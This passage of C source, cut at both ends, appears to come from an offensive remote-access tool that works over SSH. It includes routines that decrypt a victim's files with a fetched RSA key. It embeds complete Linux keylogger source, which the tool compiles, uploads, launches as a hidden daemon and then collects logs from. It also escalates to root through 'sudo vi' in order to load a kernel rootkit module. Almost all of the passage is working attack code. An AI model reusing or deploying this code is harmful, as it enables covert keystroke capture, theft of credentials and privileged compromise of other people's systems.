    while ((nbytes = sftp_read(remote_key, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_key) != nbytes) {
            fprintf(stderr, "Error writing to local key file\n");
            fclose(local_key);
            sftp_close(remote_key);
            sftp_free(sftp);
            unlink(local_key_path);
            return;
        }
    }
    
    fclose(local_key);
    sftp_close(remote_key);
    
    RSA *rsa = load_private_key(local_key_path);
    if (!rsa) {
        fprintf(stderr, "Failed to load RSA private key\n");
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }
    
    sftp_dir dir = sftp_opendir(sftp, remote_dir);
    if (!dir) {
        fprintf(stderr, "Cannot open remote directory: %s\n", ssh_get_error(session));
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }
    
    sftp_attributes attr;
    while ((attr = sftp_readdir(sftp, dir)) != NULL) {
        if (strcmp(attr->name, ".") == 0 || strcmp(attr->name, "..") == 0) {
            sftp_attributes_free(attr);
            continue;
        }
        
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", remote_dir, attr->name);
        
        if (attr->type == SSH_FILEXFER_TYPE_DIRECTORY) {
            sftp_attributes_free(attr);
            decrypt_remote_directory(session, full_path);
            continue;
        }
        
        if (attr->type == SSH_FILEXFER_TYPE_REGULAR) {
            printf("[+] Decrypting file with RSA-4096: %s\n", full_path);
            
            char temp_file[1024];
            snprintf(temp_file, sizeof(temp_file), "/tmp/%s.tmp", attr->name);
            char decrypted_file[1024];
            snprintf(decrypted_file, sizeof(decrypted_file), "/tmp/%s.decrypted", attr->name);
            
            sftp_file remote_src = sftp_open(sftp, full_path, O_RDONLY, 0);
            if (!remote_src) {
                fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
                sftp_attributes_free(attr);
                continue;
            }
            
            FILE *local_temp = fopen(temp_file, "wb");
            if (!local_temp) {
                fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
                sftp_close(remote_src);
                sftp_attributes_free(attr);
                continue;
            }
            
            while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
                if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
                    fprintf(stderr, "Error writing to local temporary file\n");
                    fclose(local_temp);
                    sftp_close(remote_src);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    continue;
                }
            }
            
            fclose(local_temp);
            sftp_close(remote_src);
            
            if (!decrypt_file(temp_file, decrypted_file, rsa)) {
                fprintf(stderr, "Error decrypting file\n");
                sftp_attributes_free(attr);
                unlink(temp_file);
                continue;
            }
            
            FILE *decrypted_src = fopen(decrypted_file, "rb");
            if (!decrypted_src) {
                fprintf(stderr, "Cannot open decrypted file: %s\n", strerror(errno));
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(decrypted_file);
                continue;
            }
            
            sftp_file remote_dst = sftp_open(sftp, full_path, O_WRONLY | O_TRUNC, 0644);
            if (!remote_dst) {
                fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
                fclose(decrypted_src);
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(decrypted_file);
                continue;
            }
            
            while ((nbytes = fread(buffer, 1, sizeof(buffer), decrypted_src)) > 0) {
                if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
                    fclose(decrypted_src);
                    sftp_close(remote_dst);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    unlink(decrypted_file);
                    continue;
                }
            }
            
            fclose(decrypted_src);
            sftp_close(remote_dst);
            
            unlink(temp_file);
            unlink(decrypted_file);
        }
        
        sftp_attributes_free(attr);
    }
    
    sftp_closedir(dir);
    RSA_free(rsa);
    sftp_free(sftp);
    unlink(local_key_path);
    
    printf("[+] Directory decryption completed with RSA-4096: %s\n", remote_dir);
}

// ==================== Keylogger Functions ====================

const char* generate_keylogger_binary() {
    static const char* keylogger_source = 
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <string.h>\n"
        "#include <fcntl.h>\n"
        "#include <unistd.h>\n"
        "#include <time.h>\n"
        "#include <linux/input.h>\n"
        "#include <dirent.h>\n"
        "#include <signal.h>\n"
        "#include <sys/stat.h>\n"
        "#include <sys/ioctl.h>\n"
        "\n"
        "char* logfile = NULL;\n"
        "int running = 1;\n"
        "\n"
        "void signal_handler(int sig) {\n"
        "    running = 0;\n"
        "}\n"
        "\n"
        "void log_key(int code, int value, FILE* log) {\n"
        "    if (value != 1) return;\n"
        "    \n"
        "    time_t now;\n"
        "    struct tm* timeinfo;\n"
        "    char timestamp[20];\n"
        "    \n"
        "    time(&now);\n"
        "    timeinfo = localtime(&now);\n"
        "    strftime(timestamp, sizeof(timestamp), \"%H:%M:%S\", timeinfo);\n"
        "    \n"
        "    char key_char = '?';\n"
        "    char* key_name = NULL;\n"
        "    \n"
        "    switch(code) {\n"
        "        case 30: key_char = 'a'; break;\n"
        "        case 48: key_char = 'b'; break;\n"
        "        case 46: key_char = 'c'; break;\n"
        "        case 32: key_char = 'd'; break;\n"
        "        case 18: key_char = 'e'; break;\n"
        "        case 33: key_char = 'f'; break;\n"
        "        case 34: key_char = 'g'; break;\n"
        "        case 35: key_char = 'h'; break;\n"
        "        case 23: key_char = 'i'; break;\n"
        "        case 36: key_char = 'j'; break;\n"
        "        case 37: key_char = 'k'; break;\n"
        "        case 38: key_char = 'l'; break;\n"
        "        case 50: key_char = 'm'; break;\n"
        "        case 49: key_char = 'n'; break;\n"
        "        case 24: key_char = 'o'; break;\n"
        "        case 25: key_char = 'p'; break;\n"
        "        case 16: key_char = 'q'; break;\n"
        "        case 19: key_char = 'r'; break;\n"
        "        case 31: key_char = 's'; break;\n"
        "        case 20: key_char = 't'; break;\n"
        "        case 22: key_char = 'u'; break;\n"
        "        case 47: key_char = 'v'; break;\n"
        "        case 17: key_char = 'w'; break;\n"
        "        case 45: key_char = 'x'; break;\n"
        "        case 21: key_char = 'y'; break;\n"
        "        case 44: key_char = 'z'; break;\n"
        "        case 2: key_char = '1'; break;\n"
        "        case 3: key_char = '2'; break;\n"
        "        case 4: key_char = '3'; break;\n"
        "        case 5: key_char = '4'; break;\n"
        "        case 6: key_char = '5'; break;\n"
        "        case 7: key_char = '6'; break;\n"
        "        case 8: key_char = '7'; break;\n"
        "        case 9: key_char = '8'; break;\n"
        "        case 10: key_char = '9'; break;\n"
        "        case 11: key_char = '0'; break;\n"
        "        case 57: key_name = \"SPACE\"; break;\n"
        "        case 28: key_name = \"ENTER\"; break;\n"
        "        case 15: key_name = \"TAB\"; break;\n"
        "        case 14: key_name = \"BACKSPACE\"; break;\n"
        "        case 1: key_name = \"ESC\"; break;\n"
        "        case 42: key_name = \"SHIFT\"; break;\n"
        "        case 54: key_name = \"SHIFT\"; break;\n"
        "        case 29: key_name = \"CTRL\"; break;\n"
        "        case 97: key_name = \"CTRL\"; break;\n"
        "        case 56: key_name = \"ALT\"; break;\n"
        "        case 100: key_name = \"ALT\"; break;\n"
        "        case 58: key_name = \"CAPSLOCK\"; break;\n"
        "        case 12: key_char = '-'; break;\n"
        "        case 13: key_char = '='; break;\n"
        "        case 26: key_char = '['; break;\n"
        "        case 27: key_char = ']'; break;\n"
        "        case 43: key_char = '\\\\'; break;\n"
        "        case 39: key_char = ';'; break;\n"
        "        case 40: key_char = '\\''; break;\n"
        "        case 41: key_char = '`'; break;\n"
        "        case 51: key_char = ','; break;\n"
        "        case 52: key_char = '.'; break;\n"
        "        case 53: key_char = '/'; break;\n"
        "        default: \n"
        "            key_name = NULL;\n"
        "            key_char = '?';\n"
        "    }\n"
        "    \n"
        "    if (key_name) {\n"
        "        fprintf(log, \"[%s] Key: %s\\n\", timestamp, key_name);\n"
        "    } else if (key_char != '?') {\n"
        "        fprintf(log, \"[%s] Key: %c\\n\", timestamp, key_char);\n"
        "    } else {\n"
        "        fprintf(log, \"[%s] Key code: %d\\n\", timestamp, code);\n"
        "    }\n"
        "    \n"
        "    fflush(log);\n"
        "}\n"
        "\n"
        "int is_keyboard_device(const char* device_path) {\n"
        "    int fd = open(device_path, O_RDONLY);\n"
        "    if (fd == -1) return 0;\n"
        "    \n"
        "    unsigned long evbit = 0;\n"
        "    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) < 0) {\n"
        "        close(fd);\n"
        "        return 0;\n"
        "    }\n"
        "    \n"
        "    close(fd);\n"
        "    return (evbit & (1 << EV_KEY));\n"
        "}\n"
        "\n"
        "void write_pid_file() {\n"
        "    FILE* pid_file = fopen(\"/tmp/.keylogger.pid\", \"w\");\n"
        "    if (pid_file) {\n"
        "        fprintf(pid_file, \"%d\\n\", getpid());\n"
        "        fclose(pid_file);\n"
        "    }\n"
        "}\n"
        "\n"
        "int main(int argc, char* argv[]) {\n"
        "    if (argc < 2) {\n"
        "        fprintf(stderr, \"Usage: %s <logfile>\\n\", argv[0]);\n"
        "        return 1;\n"
        "    }\n"
        "    \n"
        "    logfile = argv[1];\n"
        "    \n"
        "    pid_t pid = fork();\n"
        "    if (pid < 0) exit(EXIT_FAILURE);\n"
        "    if (pid > 0) exit(EXIT_SUCCESS);\n"
        "    \n"
        "    umask(0);\n"
        "    setsid();\n"
        "    chdir(\"/\");\n"
        "    \n"
        "    close(STDIN_FILENO);\n"
        "    close(STDOUT_FILENO);\n"
        "    close(STDERR_FILENO);\n"
        "    \n"
        "    signal(SIGTERM, signal_handler);\n"
        "    signal(SIGINT, signal_handler);\n"
        "    \n"
        "    write_pid_file();\n"
        "    \n"
        "    FILE* log = fopen(logfile, \"a\");\n"
        "    if (!log) return 1;\n"
        "    \n"
        "    time_t now = time(NULL);\n"
        "    fprintf(log, \"\\n=== Keylogger started at %.24s ===\\n\", ctime(&now));\n"
        "    fflush(log);\n"
        "    \n"
        "    DIR* dir = opendir(\"/dev/input\");\n"
        "    if (!dir) {\n"
        "        fclose(log);\n"
        "        return 1;\n"
        "    }\n"
        "    \n"
        "    struct dirent* entry;\n"
        "    int num_devices = 0;\n"
        "    int* fds = NULL;\n"
        "    \n"
        "    while ((entry = readdir(dir)) != NULL) {\n"
        "        if (strncmp(entry->d_name, \"event\", 5) == 0) {\n"
        "            char device_path[256];\n"
        "            snprintf(device_path, sizeof(device_path), \"/dev/input/%s\", entry->d_name);\n"
        "            \n"
        "            if (is_keyboard_device(device_path)) {\n"
        "                int fd = open(device_path, O_RDONLY);\n"
        "                if (fd != -1) {\n"
        "                    fds = realloc(fds, (num_devices + 1) * sizeof(int));\n"
        "                    fds[num_devices++] = fd;\n"
        "                    fprintf(log, \"Monitoring keyboard device: %s\\n\", device_path);\n"
        "                    fflush(log);\n"
        "                }\n"
        "            }\n"
        "        }\n"
        "    }\n"
        "    \n"
        "    closedir(dir);\n"
        "    \n"
        "    if (num_devices == 0) {\n"
        "        fprintf(log, \"No keyboard devices found\\n\");\n"
        "        fclose(log);\n"
        "        return 1;\n"
        "    }\n"
        "    \n"
        "    struct input_event ev;\n"
        "    fd_set readfds;\n"
        "    \n"
        "    while (running) {\n"
        "        FD_ZERO(&readfds);\n"
        "        int max_fd = 0;\n"
        "        \n"
        "        for (int i = 0; i < num_devices; i++) {\n"
        "            FD_SET(fds[i], &readfds);\n"
        "            if (fds[i] > max_fd) max_fd = fds[i];\n"
        "        }\n"
        "        \n"
        "        struct timeval tv = {1, 0};\n"
        "        int ret = select(max_fd + 1, &readfds, NULL, NULL, &tv);\n"
        "        \n"
        "        if (ret <= 0) continue;\n"
        "        \n"
        "        for (int i = 0; i < num_devices; i++) {\n"
        "            if (FD_ISSET(fds[i], &readfds)) {\n"
        "                ssize_t bytes_read = read(fds[i], &ev, sizeof(ev));\n"
        "                if (bytes_read == sizeof(ev)) {\n"
        "                    if (ev.type == EV_KEY) {\n"
        "                        log_key(ev.code, ev.value, log);\n"
        "                    }\n"
        "                }\n"
        "            }\n"
        "        }\n"
        "    }\n"
        "    \n"
        "    for (int i = 0; i < num_devices; i++) {\n"
        "        close(fds[i]);\n"
        "    }\n"
        "    free(fds);\n"
        "    \n"
        "    now = time(NULL);\n"
        "    fprintf(log, \"=== Keylogger stopped at %.24s ===\\n\", ctime(&now));\n"
        "    fclose(log);\n"
        "    \n"
        "    unlink(\"/tmp/.keylogger.pid\");\n"
        "    return 0;\n"
        "}\n";
    
    return keylogger_source;
}

int deploy_remote_keylogger(ssh_session session, const char *remote_logfile) {
    printf("[*] Preparing remote keylogger...\n");
    
    char temp_source_path[PATH_MAX];
    snprintf(temp_source_path, sizeof(temp_source_path), "/tmp/keylogger_XXXXXX.c");
    int fd = mkstemps(temp_source_path, 2);
    if (fd < 0) {
        perror("Failed to create temporary source file");
        return -1;
    }
    
    const char* keylogger_source = generate_keylogger_binary();
    if (write(fd, keylogger_source, strlen(keylogger_source)) != (ssize_t)strlen(keylogger_source)) {
        perror("Failed to write source code");
        close(fd);
        unlink(temp_source_path);
        return -1;
    }
    close(fd);
    
    char temp_binary_path[PATH_MAX];
    snprintf(temp_binary_path, sizeof(temp_binary_path), "/tmp/keylogger_XXXXXX");
    fd = mkstemp(temp_binary_path);
    if (fd < 0) {
        perror("Failed to create temporary binary file");
        unlink(temp_source_path);
        return -1;
    }
    close(fd);
    
    char compile_cmd[1024];
    snprintf(compile_cmd, sizeof(compile_cmd), 
             "gcc -O2 -o %s %s -static", 
             temp_binary_path, temp_source_path);
    
    printf("[*] Compiling keylogger: %s\n", compile_cmd);
    int result = system(compile_cmd);
    if (result != 0) {
        fprintf(stderr, "Failed to compile keylogger (exit code: %d)\n", result);
        unlink(temp_source_path);
        unlink(temp_binary_path);
        return -1;
    }
    
    unlink(temp_source_path);
    
    FILE *binary_file = fopen(temp_binary_path, "rb");
    if (!binary_file) {
        perror("Failed to open compiled binary");
        unlink(temp_binary_path);
        return -1;
    }
    
    fseek(binary_file, 0, SEEK_END);
    long binary_size = ftell(binary_file);
    fseek(binary_file, 0, SEEK_SET);
    
    if (binary_size <= 0) {
        fprintf(stderr, "Invalid binary size: %ld\n", binary_size);
        fclose(binary_file);
        unlink(temp_binary_path);
        return -1;
    }
    
    char *binary_data = malloc(binary_size);
    if (!binary_data) {
        perror("Failed to allocate memory for binary");
        fclose(binary_file);
        unlink(temp_binary_path);
        return -1;
    }
    
    if (fread(binary_data, 1, binary_size, binary_file) != (size_t)binary_size) {
        perror("Failed to read binary file");
        free(binary_data);
        fclose(binary_file);
        unlink(temp_binary_path);
        return -1;
    }
    
    fclose(binary_file);
    unlink(temp_binary_path);
    
    char remote_binary_path[PATH_MAX] = "/tmp/.keylogger";
    
    ssh_channel channel = ssh_channel_new(session);
    if (channel && ssh_channel_open_session(channel) == SSH_OK) {
        if (ssh_channel_request_exec(channel, "echo $HOME") == SSH_OK) {
            char home_path[256] = {0};
            int nbytes = ssh_channel_read(channel, home_path, sizeof(home_path) - 1, 0);
            if (nbytes > 0) {
                home_path[nbytes] = '\0';
                char *newline = strchr(home_path, '\n');
                if (newline) *newline = '\0';
                newline = strchr(home_path, '\r');
                if (newline) *newline = '\0';
                
                if (strlen(home_path) > 0) {
                    snprintf(remote_binary_path, sizeof(remote_binary_path), 
                            "%s/.keylogger", home_path);
                }
            }
        }
        ssh_channel_close(channel);
        ssh_channel_free(channel);
    }
    
    printf("[*] Uploading keylogger to %s (%ld bytes)...\n", remote_binary_path, binary_size);
    
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        free(binary_data);
        return -1;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        free(binary_data);
        return -1;
    }
    
    sftp_file remote_file = sftp_open(sftp, remote_binary_path, 
                                      O_WRONLY | O_CREAT | O_TRUNC, 
                                      S_IRUSR | S_IWUSR | S_IXUSR);
    if (!remote_file) {
        fprintf(stderr, "Error opening remote file %s: %s\n", 
                remote_binary_path, ssh_get_error(session));
        sftp_free(sftp);
        free(binary_data);
        return -1;
    }
    
    size_t written = 0;
    while (written < (size_t)binary_size) {
        size_t to_write = binary_size - written;
        if (to_write > 32768) to_write = 32768;
        
        int bytes = sftp_write(remote_file, binary_data + written, to_write);
        if (bytes < 0) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            sftp_close(remote_file);
            sftp_free(sftp);
            free(binary_data);
            return -1;
        }
        
        written += bytes;
    }
    
    sftp_close(remote_file);
    sftp_free(sftp);
    free(binary_data);
    
    printf("[*] Starting remote keylogger...\n");
    
    channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    char start_cmd[1024];
    snprintf(start_cmd, sizeof(start_cmd), 
             "chmod +x %s && nohup %s %s >/dev/null 2>&1 &", 
             remote_binary_path, remote_binary_path, remote_logfile);
    
    if (ssh_channel_request_exec(channel, start_cmd) != SSH_OK) {
        fprintf(stderr, "Error executing remote command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    char buffer[1024];
    int nbytes;
    int timeout = 3;
    
    while (timeout > 0 && (nbytes = ssh_channel_read_timeout(channel, buffer, sizeof(buffer) - 1, 0, 1000)) > 0) {
        buffer[nbytes] = '\0';
        printf("Remote output: %s", buffer);
        timeout--;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    printf("[+] Remote keylogger successfully deployed and started\n");
    printf("[+] Log file: %s\n", remote_logfile);
    printf("[+] Binary location: %s\n", remote_binary_path);
    
    return 0;
}

int stop_remote_keylogger_process(ssh_session session) {
    printf("[*] Stopping remote keylogger...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    const char *stop_cmd = "if [ -f /tmp/.keylogger.pid ]; then "
                          "kill $(cat /tmp/.keylogger.pid) 2>/dev/null; "
                          "rm -f /tmp/.keylogger.pid; "
                          "echo 'Keylogger stopped'; "
                          "else "
                          "pkill -f ~/.keylogger 2>/dev/null; "
                          "echo 'Attempted to stop keylogger'; "
                          "fi";
    
    if (ssh_channel_request_exec(channel, stop_cmd) != SSH_OK) {
        fprintf(stderr, "Error executing remote command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    char buffer[1024];
    int nbytes;
    while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[nbytes] = '\0';
        printf("%s", buffer);
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return 0;
}

void start_remote_keylogger(keylogger_data_t *data, ssh_session session, const char *remote_logfile) {
    data->running = 1;
    data->session = session;
    
    if (remote_logfile) {
        strncpy(data->logfile, remote_logfile, sizeof(data->logfile) - 1);
    } else {
        strncpy(data->logfile, "/tmp/.keylog", sizeof(data->logfile) - 1);
    }
    data->logfile[sizeof(data->logfile) - 1] = '\0';
    
    if (deploy_remote_keylogger(session, data->logfile) == 0) {
        printf("[+] Remote keylogger started (logging to %s)\n", data->logfile);
    } else {
        fprintf(stderr, "[-] Failed to start remote keylogger\n");
        data->running = 0;
    }
}

void stop_remote_keylogger(keylogger_data_t *data) {
    if (!data->running) return;
    
    if (stop_remote_keylogger_process(data->session) == 0) {
        printf("[+] Remote keylogger stopped\n");
    } else {
        fprintf(stderr, "[-] Failed to stop remote keylogger\n");
    }
    
    data->running = 0;
}

int download_keylogs(keylogger_data_t *data, const char *local_path) {
    if (!data || !data->session || !local_path) {
        fprintf(stderr, "Invalid keylogger data or local path\n");
        return -1;
    }
    
    char dir_path[PATH_MAX] = {0};
    strncpy(dir_path, local_path, PATH_MAX - 1);
    
    char *last_slash = strrchr(dir_path, '/');
    if (last_slash) {
        *last_slash = '\0';
        
        if (strlen(dir_path) > 0) {
            struct stat st = {0};
            if (stat(dir_path, &st) == -1) {
                fprintf(stderr, "Directory %s does not exist\n", dir_path);
                return -1;
            }
        }
    }
    
    FILE *local_file = fopen(local_path, "w");
    if (!local_file) {
        fprintf(stderr, "Failed to open local file: %s\n", strerror(errno));
        return -1;
    }
    
    sftp_session sftp = sftp_new(data->session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", 
                ssh_get_error(data->session));
        fclose(local_file);
        return -1;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n",
                ssh_get_error(data->session));
        sftp_free(sftp);
        fclose(local_file);
        return -1;
    }
    
    sftp_file remote_file = sftp_open(sftp, data->logfile, O_RDONLY, 0);
    if (!remote_file) {
        fprintf(stderr, "Error opening remote file: %s\n", 
                ssh_get_error(data->session));
        sftp_free(sftp);
        fclose(local_file);
        return -1;
    }
    
    char buffer[4096];
    ssize_t nbytes, nwritten;
    int success = 1;
    
    while ((nbytes = sftp_read(remote_file, buffer, sizeof(buffer))) > 0) {
        nwritten = fwrite(buffer, 1, nbytes, local_file);
        if (nwritten != nbytes) {
            fprintf(stderr, "Error writing to local file: %s\n", strerror(errno));
            success = 0;
            break;
        }
    }
    
    if (nbytes < 0) {
        fprintf(stderr, "Error reading remote file: %s\n", 
                ssh_get_error(data->session));
        success = 0;
    }
    
    sftp_close(remote_file);
    sftp_free(sftp);
    fclose(local_file);
    
    if (success) {
        printf("[+] Keylogs downloaded to %s\n", local_path);
        return 0;
    } else {
        return -1;
    }
}

// ==================== Password Management ====================

int load_password_from_file(const char *password_file) {
    if (password_loaded && global_password) {
        return 1;
    }
    
    FILE *pf = fopen(password_file, "r");
    if (!pf) {
        fprintf(stderr, "Can't open password file %s\n", password_file);
        return 0;
    }
    
    char password[256];
    if (fgets(password, sizeof(password), pf)) {
        password[strcspn(password, "\n\r")] = 0;
        
        if (global_password) {
            free(global_password);
        }
        
        global_password = strdup(password);
        if (global_password) {
            password_loaded = 1;
            printf("[+] Password loaded from file: %s\n", password_file);
            fclose(pf);
            return 1;
        }
    }
    
    fclose(pf);
    fprintf(stderr, "[-] Failed to load password from file\n");
    return 0;
}

int authenticate_ssh_session_auto(ssh_session session, const char *password_file) {
    if (password_file && !password_loaded) {
        if (!load_password_from_file(password_file)) {
            return -1;
        }
    }
    
    printf("[*] Starting authentication...\n");
    
    if (ssh_userauth_publickey_auto(session, NULL, NULL) == SSH_AUTH_SUCCESS) {
        printf("[+] Authenticated with public key\n");
        return 0;
    }
    
    if (global_password) {
        printf("[*] Trying password authentication...\n");
        if (ssh_userauth_password(session, NULL, global_password) == SSH_AUTH_SUCCESS) {
            printf("[+] Authenticated with password\n");
            return 0;
        } else {
            fprintf(stderr, "[-] Password authentication failed\n");
            return -1;
        }
    }
    
    char *password = getpass("Password: ");
    if (ssh_userauth_password(session, NULL, password) != SSH_AUTH_SUCCESS) {
        fprintf(stderr, "[-] Authentication failed\n");
        memset(password, 0, strlen(password));
        return -1;
    }
    
    printf("[+] Authenticated with interactive password\n");
    memset(password, 0, strlen(password));
    return 0;
}

void cleanup_password() {
    if (global_password) {
        memset(global_password, 0, strlen(global_password));
        free(global_password);
        global_password = NULL;
    }
    password_loaded = 0;
}

// ==================== VIM Exploit Functions ====================

int execute_root_command_via_vim(ssh_session session, const char *command) {
    printf("[*] Executing root command via vim exploit: %s\n", command);
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    const char *vim_command = "sudo vi -c ':!/bin/bash'\n";
    if (ssh_channel_write(channel, vim_command, strlen(vim_command)) < 0) {
        fprintf(stderr, "Error writing vim command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(2000000);
    
    char full_command[2048];
    snprintf(full_command, sizeof(full_command), "%s\n", command);
    
    if (ssh_channel_write(channel, full_command, strlen(full_command)) < 0) {
        fprintf(stderr, "Error writing command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(3000000);
    
    const char *exit_cmd = "exit\n";
    ssh_channel_write(channel, exit_cmd, strlen(exit_cmd));
    
    usleep(1000000);
    
    const char *quit_vim = ":q!\n";
    ssh_channel_write(channel, quit_vim, strlen(quit_vim));
    
    char buffer[4096];
    int nbytes;
    int success_detected = 0;
    int timeout = 10;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "insmod") && !strstr(buffer, "error") && !strstr(buffer, "Error")) {
                success_detected = 1;
            }
            if (strstr(buffer, "Operation not permitted") || 
                strstr(buffer, "Permission denied") ||
                strstr(buffer, "Invalid module format")) {
                success_detected = 0;
                break;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    if (success_detected) {
        printf("[+] Root command executed successfully via vim exploit\n");
        return 0;
    } else {
        printf("[-] Command execution may have failed\n");
        return -1;
    }
}

int execute_root_command_via_vim_v2(ssh_session session, const char *command) {
    printf("[*] Executing root command via vim exploit (method 2): %s\n", command);
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    char script_content[2048];
    snprintf(script_content, sizeof(script_content), 
             "#!/bin/bash\n"
             "echo \"Starting rootkit loading...\"\n"
             "%s\n"
             "if [ $? -eq 0 ]; then\n"
             "    echo \"INSMOD_SUCCESS\"\n"
             "    lsmod | grep boogaloo && echo \"MODULE_VERIFIED_LOADED\"\n"
             "else\n"
             "    echo \"INSMOD_FAILED\"\n"
             "fi\n"
             "echo \"COMMAND_EXECUTED_SUCCESSFULLY\"\n", command);
    
    char write_script_cmd[3072];
    snprintf(write_script_cmd, sizeof(write_script_cmd), 
             "cat > /tmp/.vim_script.sh << 'EOF'\n%sEOF\n", script_content);
    
    if (ssh_channel_write(channel, write_script_cmd, strlen(write_script_cmd)) < 0) {
        fprintf(stderr, "Error writing script creation command\n");
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(1000000);
    
    const char *chmod_cmd = "chmod +x /tmp/.vim_script.sh\n";
    ssh_channel_write(channel, chmod_cmd, strlen(chmod_cmd));
    usleep(500000);
    
    const char *vim_exec_cmd = "sudo vi -c ':!insmod /tmp/.rootkit_*/boogaloo_rootkit.ko' -c ':q!' /dev/null\n";
    if (ssh_channel_write(channel, vim_exec_cmd, strlen(vim_exec_cmd)) < 0) {
        fprintf(stderr, "Error executing vim command\n");
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int password_prompt_detected = 0;
    
    nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
    if (nbytes > 0) {
        buffer[nbytes] = '\0';
        printf("Initial output: %s", buffer);
        
        if (strstr(buffer, "password") || strstr(buffer, "Password")) {
            password_prompt_detected = 1;
            printf("[!] Password prompt detected - vim exploit requires NOPASSWD sudo access\n");
        }
    }
    
    if (password_prompt_detected) {
        const char *cleanup_cmd = "rm -f /tmp/.vim_script.sh\n";
        ssh_channel_write(channel, cleanup_cmd, strlen(cleanup_cmd));
        ssh_channel_send_eof(channel);
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(5000000);
    
    const char *cleanup_cmd = "rm -f /tmp/.vim_script.sh\n";
    ssh_channel_write(channel, cleanup_cmd, strlen(cleanup_cmd));
    
    int success = 0;
    int module_verified = 0;
    int timeout = 15;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
